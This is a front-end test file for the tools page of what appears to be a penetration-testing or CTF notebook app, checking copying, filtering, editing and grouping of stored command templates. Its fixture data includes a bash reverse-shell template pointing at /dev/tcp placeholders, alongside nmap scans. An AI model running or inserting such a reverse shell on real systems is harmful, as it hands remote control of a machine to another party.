// @vitest-environment jsdom
import { beforeEach, expect, test, vi } from 'vitest'
import { act, render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import type { ToolListItem } from '../../../shared/types'
import { ContextProvider } from '../shell/TargetBar'
import { ToolsPage } from './ToolsPage'

const json = (status: number, body: unknown) => new Response(JSON.stringify(body), { status })
const tools: ToolListItem[] = [
  { id: 1, shortId: 'TL-001', name: 'nmap', description: 'Port scanner', techniques: [{ id: 1, name: 'Port scanning' }],
    commands: [{ id: 1, purpose: 'All TCP ports', template: 'nmap -p- {{TARGET}}', procedureKey: null, position: null, intent: '' }] },
  { id: 2, shortId: 'TL-002', name: 'Reverse shells', description: '', techniques: [],
    commands: [{ id: 2, purpose: 'Bash', template: 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1', procedureKey: null, position: null, intent: '' }] },
]
let fetchMock: ReturnType<typeof vi.fn>
beforeEach(() => {
  fetchMock = vi.fn(async (url: string, init?: RequestInit) => {
    if (url === '/api/context') return json(200, { target: '10.10.11.35', lhost: '10.10.14.7', lport: '4444', activeBoxId: 3 })
    if (url === '/api/tools') return json(200, tools)
    if (init?.method === 'POST') return json(201, { id: 9, procedureKey: null, position: null, ...JSON.parse(init.body as string) })
    return json(200, {})
  })
  vi.stubGlobal('fetch', fetchMock)
})

const setup = () => {
  const user = userEvent.setup() // before stubbing: setup() installs its own clipboard
  const writeText = vi.fn(async () => {})
  Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
  render(<ContextProvider><ToolsPage /></ContextProvider>)
  return { user, writeText }
}
const calls = (url: string, method: string) => fetchMock.mock.calls.filter(([u, i]) => u === url && i?.method === method)

test('Copy writes the substituted command', async () => {
  const { user, writeText } = setup()
  const row = (await screen.findByText('10.10.11.35', { selector: 'mark' })).closest('li') as HTMLElement
  await user.click(within(row).getByRole('button', { name: 'Copy All TCP ports' }))
  expect(writeText).toHaveBeenCalledWith('nmap -p- 10.10.11.35')
  expect(await within(row).findByRole('button', { name: 'Copied All TCP ports' })).toBeTruthy()
})

test('filter narrows tools by name or command text', async () => {
  const { user } = setup()
  await screen.findByText('nmap')
  await user.type(screen.getByLabelText('Filter tools and commands'), 'dev/tcp')
  expect(screen.queryByText('nmap')).toBeNull()
  expect(screen.getByText('Reverse shells')).toBeTruthy()
})

test('adding a command posts purpose and the raw template', async () => {
  const { user } = setup()
  await user.type(await screen.findByLabelText('Purpose of a new nmap command'), 'Scripts')
  await user.click(screen.getByLabelText('New nmap command'))
  await user.paste('nmap -sC {{TARGET}}')
  await user.click(screen.getByRole('button', { name: 'Add command to nmap' }))
  await waitFor(() => expect(calls('/api/tools/1/commands', 'POST').map(([, i]) => JSON.parse(i.body))).toEqual([{ purpose: 'Scripts', template: 'nmap -sC {{TARGET}}', intent: '' }]))
})

test('editing a command patches purpose and template, then focus returns to Edit', async () => {
  const { user } = setup()
  await user.click(await screen.findByRole('button', { name: 'Edit command All TCP ports' }))
  const purpose = screen.getByLabelText('Purpose of command All TCP ports')
  await user.clear(purpose)
  await user.type(purpose, 'Every port')
  await user.click(screen.getByRole('button', { name: 'Save' }))
  await waitFor(() => expect(calls('/api/commands/1', 'PATCH').map(([, i]) => JSON.parse(i.body))).toEqual([{ purpose: 'Every port', template: 'nmap -p- {{TARGET}}', intent: '' }]))
  await waitFor(() => expect(document.activeElement).toBe(screen.getByRole('button', { name: 'Edit command All TCP ports' })))
})

test('Esc cancels an edit and returns focus to Edit', async () => {
  const { user } = setup()
  await user.click(await screen.findByRole('button', { name: 'Edit command Bash' }))
  await user.keyboard('{Escape}')
  expect(document.activeElement).toBe(screen.getByRole('button', { name: 'Edit command Bash' }))
  expect(calls('/api/commands/2', 'PATCH')).toEqual([])
})

test('a failed delete shows its error on that row', async () => {
  const { user } = setup()
  vi.stubGlobal('confirm', () => true)
  fetchMock.mockImplementationOnce(async () => json(404, { error: 'command not found' }))
  await user.click(await screen.findByRole('button', { name: 'Delete command Bash' }))
  const row = screen.getByRole('button', { name: 'Edit command Bash' }).closest('li') as HTMLElement
  expect((await within(row).findByRole('alert')).textContent).toBe('command not found')
})

test('?tool= and ?cmd= scroll to that tool or command and highlight it', async () => {
  const scroll = vi.fn()
  Element.prototype.scrollIntoView = scroll
  location.hash = '#/tools?cmd=1'
  const { container, unmount } = render(<ContextProvider><ToolsPage /></ContextProvider>)
  await waitFor(() => expect(container.querySelector('#cmd-1')?.classList.contains('flash')).toBe(true))
  expect(scroll.mock.contexts[0]).toBe(container.querySelector('#cmd-1'))
  unmount()
  location.hash = '#/tools?tool=2'
  const second = render(<ContextProvider><ToolsPage /></ContextProvider>)
  await waitFor(() => expect(second.container.querySelector('#tool-2')?.classList.contains('flash')).toBe(true))
  delete (Element.prototype as Partial<Element>).scrollIntoView
  location.hash = ''
})

test('Delete asks, then deletes the command and reloads', async () => {
  const { user } = setup()
  const confirm = vi.fn(() => true)
  vi.stubGlobal('confirm', confirm)
  await user.click(await screen.findByRole('button', { name: 'Delete command Bash' }))
  expect(confirm).toHaveBeenCalled()
  await waitFor(() => expect(calls('/api/commands/2', 'DELETE')).toHaveLength(1))
  await waitFor(() => expect(fetchMock.mock.calls.filter(([u]) => u === '/api/tools').length).toBe(2))
})

test('a command without a purpose is named by the start of its template, not all of it', async () => {
  const long = `powershell -nop -c "${'A'.repeat(200)}"`
  fetchMock.mockImplementation(async (url: string) => json(200, url === '/api/tools'
    ? [{ ...tools[0], commands: [{ id: 5, purpose: '', template: long, procedureKey: null, position: null, intent: '' }] }]
    : { target: '', lhost: '', lport: '', activeBoxId: null }))
  setup()
  const edit = await screen.findByRole('button', { name: /^Edit command / })
  expect(edit.getAttribute('aria-label')).toBe(`Edit command ${long.slice(0, 40)}…`)
})

const mk = (id: number, intent: string) => ({ id, purpose: `c${id}`, template: `t${id}`, procedureKey: null, position: null, intent })

test('groups commands by intent with counts and a show-all fold', async () => {
  const commands = [1, 2, 3].map((i) => mk(i, 'discover')).concat([4, 5, 6, 7, 8, 9, 10, 11, 12, 13].map((i) => mk(i, 'enumerate')), [mk(14, '')])
  fetchMock.mockImplementation(async (url: string) => json(200, url === '/api/tools'
    ? [{ ...tools[0], commands }] : { target: '', lhost: '', lport: '', activeBoxId: null }))
  const { user } = setup()
  const group = await screen.findByRole('group', { name: 'Intents for nmap' })
  expect(within(group).getAllByRole('button').map((b) => b.textContent)).toEqual(['discover 3', 'enumerate 10', 'other 1'])
  expect(within(group).getByRole('button', { name: 'discover 3' }).getAttribute('aria-pressed')).toBe('true')
  expect(screen.getAllByRole('button', { name: /^Edit command / })).toHaveLength(3)
  await user.click(within(group).getByRole('button', { name: 'enumerate 10' }))
  expect(screen.getAllByRole('button', { name: /^Edit command / })).toHaveLength(8)
  await user.click(screen.getByRole('button', { name: 'show all 10' }))
  expect(screen.getAllByRole('button', { name: /^Edit command / })).toHaveLength(10)
})

test('add and edit carry intent', async () => {
  const list = [{ ...tools[0], commands: [{ ...tools[0].commands[0] }] }]
  fetchMock.mockImplementation(async (url: string, init?: RequestInit) => {
    if (url === '/api/tools') return json(200, list)
    if (init?.method === 'POST') { const b = JSON.parse(init.body as string); list[0].commands.push({ ...mk(9, b.intent), ...b }); return json(201, {}) }
    if (init?.method === 'PATCH') { list[0].commands[0].intent = JSON.parse(init.body as string).intent; return json(200, {}) }
    return json(200, { target: '', lhost: '', lport: '', activeBoxId: null })
  })
  const { user } = setup()
  await user.selectOptions(await screen.findByLabelText('Intent of a new nmap command'), 'tune')
  await user.click(screen.getByLabelText('New nmap command'))
  await user.paste('nmap -T4 {{TARGET}}')
  await user.click(screen.getByRole('button', { name: 'Add command to nmap' }))
  await waitFor(() => expect(calls('/api/tools/1/commands', 'POST').map(([, i]) => JSON.parse(i.body).intent)).toEqual(['tune']))
  expect((await screen.findByRole('button', { name: 'tune 1' })).getAttribute('aria-pressed')).toBe('true')
  await user.click(screen.getByRole('button', { name: 'other 1' }))
  await user.click(screen.getByRole('button', { name: 'Edit command All TCP ports' }))
  await user.selectOptions(screen.getByLabelText('Intent of command All TCP ports'), 'discover')
  await user.click(screen.getByRole('button', { name: 'Save' }))
  await waitFor(() => expect(calls('/api/commands/1', 'PATCH').map(([, i]) => JSON.parse(i.body).intent)).toEqual(['discover']))
  expect((await screen.findByRole('button', { name: 'discover 1' })).getAttribute('aria-pressed')).toBe('true')
})

test('?cmd= opens the group and fold holding that command', async () => {
  const commands = [1, 2].map((i) => mk(i, 'discover')).concat([3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((i) => mk(i, 'enumerate')))
  fetchMock.mockImplementation(async (url: string) => json(200, url === '/api/tools'
    ? [{ ...tools[0], commands }] : { target: '', lhost: '', lport: '', activeBoxId: null }))
  location.hash = '#/tools?cmd=12'
  try {
    setup()
    expect(await screen.findByRole('button', { name: 'Edit command c12' })).toBeTruthy()
    expect(screen.getByRole('button', { name: 'enumerate 10' }).getAttribute('aria-pressed')).toBe('true')
  } finally { location.hash = '' }
})

test('a ?cmd= change while mounted switches group and fold', async () => {
  const commands = [1, 2].map((i) => mk(i, 'discover')).concat([3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((i) => mk(i, 'enumerate')))
  fetchMock.mockImplementation(async (url: string) => json(200, url === '/api/tools'
    ? [{ ...tools[0], commands }] : { target: '', lhost: '', lport: '', activeBoxId: null }))
  try {
    setup()
    await screen.findByRole('button', { name: 'discover 2' })
    expect(screen.queryByRole('button', { name: 'Edit command c12' })).toBeNull()
    act(() => { location.hash = '#/tools?cmd=12'; dispatchEvent(new HashChangeEvent('hashchange')) })
    expect(await screen.findByRole('button', { name: 'Edit command c12' })).toBeTruthy()
    expect(screen.getByRole('button', { name: 'enumerate 10' }).getAttribute('aria-pressed')).toBe('true')
  } finally { location.hash = '' }
})

test('searching lists every matching command flat, without groups or the fold', async () => {
  const commands = [1, 2, 3].map((i) => mk(i, 'discover')).concat([4, 5, 6, 7, 8, 9, 10, 11, 12, 13].map((i) => mk(i, 'enumerate')), [mk(14, '')])
  fetchMock.mockImplementation(async (url: string) => json(200, url === '/api/tools'
    ? [{ ...tools[0], commands }] : { target: '', lhost: '', lport: '', activeBoxId: null }))
  const { user } = setup()
  await screen.findByRole('group', { name: 'Intents for nmap' })
  await user.type(screen.getByLabelText('Filter tools and commands'), 'c1')
  expect(screen.getByRole('button', { name: 'Edit command c12' })).toBeTruthy()
  expect(screen.getAllByRole('button', { name: /^Edit command / }).map((b) => b.getAttribute('aria-label'))).toEqual(
    [1, 10, 11, 12, 13, 14].map((i) => `Edit command c${i}`))
  expect(screen.queryByRole('group', { name: 'Intents for nmap' })).toBeNull()
})

test('Add tool posts the tool, reloads and jumps to it', async () => {
  const added: ToolListItem = { id: 3, shortId: 'TL-003', name: 'feroxbuster', description: 'Content discovery', commands: [], techniques: [] }
  let list = tools
  fetchMock.mockImplementation(async (url: string, init?: RequestInit) => {
    if (url === '/api/context') return json(200, { target: '', lhost: '', lport: '', activeBoxId: null })
    if (url === '/api/tools' && init?.method === 'POST') { list = [...tools, added]; return json(201, added) }
    return json(200, url === '/api/tools' ? list : {})
  })
  const { user } = setup()
  await user.type(await screen.findByLabelText('Name of a new tool'), 'feroxbuster')
  await user.type(screen.getByLabelText('Description of the new tool'), 'Content discovery')
  await user.click(screen.getByRole('button', { name: 'Add tool' }))
  await waitFor(() => expect(location.hash).toBe('#/tools?tool=3'))
  expect(JSON.parse(calls('/api/tools', 'POST')[0][1].body)).toEqual({ name: 'feroxbuster', description: 'Content discovery' })
  expect(screen.getByRole('heading', { name: 'feroxbuster' })).toBeTruthy()
  expect((screen.getByLabelText('Name of a new tool') as HTMLInputElement).value).toBe('')
  location.hash = ''
})

